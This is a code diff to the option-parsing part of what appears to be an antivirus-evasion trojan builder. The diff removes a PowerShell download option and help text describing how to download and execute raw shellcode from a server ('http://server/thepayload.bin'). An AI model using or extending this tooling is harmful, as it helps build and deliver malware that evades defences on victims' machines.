@@ -20,20 +20,15 @@ int main (int argc, char **argv)
 	
 	char *evalue = NULL;	
 	int hflag = 0;	
-	int Eflag = 0;	
-	char *dvalue = NULL;
-	
+	int Eflag = 0;		
 	int c;
 
 	opterr = 0;
 
 	// compute the options
-	while ((c = getopt (argc, argv, "e:d:hE")) != -1)
+	while ((c = getopt (argc, argv, "e:hE")) != -1)
 		switch (c)
 		{
-			case 'd':
-				dvalue = optarg;
-				break;
 			case 'e':
 				evalue = optarg;
 				break;				
@@ -70,13 +65,7 @@ int main (int argc, char **argv)
 	
 	//write ENCRYPT to defs.h
 	if(Eflag)
-		fprintf (file_def, "#define ENCRYPT\n");	
-
-	if(dvalue)
-	{
-		if (strcmp(dvalue, "powershell")==0)
-			fprintf (file_def, "#define DOWNLOADPOWERSHELL\n");
-	}
+		fprintf (file_def, "#define ENCRYPT\n");		
 	
 	fclose(file_def);	
 
@@ -85,11 +74,7 @@ int main (int argc, char **argv)
 void print_help()
 {
 	printf("Options:\n");	
-	printf("   when called with -E call with mytrojan.exe shellcode.txt\n");	
-	printf("   -d powershell -> use powershell for downloading the file\n");
-	printf("      usage of -d certutil/powershell in combination with -f\n");
-	printf("      for executing the raw shellcode after downloading\n");
-	printf("      call: pwn thepayload.bin http://server/thepayload.bin\n");
+	printf("   when called with -E call with mytrojan.exe shellcode.txt\n");		
 	printf("-E use avets ASCII encryption, often do not has to be used\n");		
 	printf("-h help\n\n");
 	printf("Please refer README.md for more information\n");
